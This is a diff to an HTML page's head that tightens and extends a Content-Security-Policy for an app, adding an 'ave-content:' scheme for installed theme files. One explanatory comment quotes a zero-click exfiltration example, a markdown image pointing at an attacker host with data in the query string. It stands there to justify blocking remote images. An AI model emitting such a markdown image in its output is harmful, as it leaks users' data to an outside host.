@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="ko">
+<html lang="en">
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -30,7 +30,9 @@
         • `img-src 'self' data: blob:` — no remote image loads. That is the
           zero-click exfil channel (`![](https://attacker/?d=…)`); rendering is
           already blocked in AssistantCard, and this is the platform-level
-          backstop under it.
+          backstop under it. `ave-content:` is the host scheme for installed
+          theme previews and fonts (`img-src`, `font-src`); it serves only
+          files of installed packages, never a network address.
         • `object-src 'none'`, `base-uri 'none'`, `form-action 'none'` — no
           plugins, no <base> rewrite of every relative URL, no form posts.
         • `frame-src 'self'` — the sandboxed preview frames are same-origin
@@ -44,7 +46,7 @@
     -->
     <meta
       http-equiv="Content-Security-Policy"
-      content="default-src 'self'; connect-src 'none'; img-src 'self' data: blob:; media-src 'self' data: blob:; font-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
+      content="default-src 'self'; connect-src 'none'; img-src 'self' data: blob: ave-content:; media-src 'self' data: blob:; font-src 'self' ave-content:; object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
     />
     <link rel="stylesheet" href="./styles.css" />
   </head>
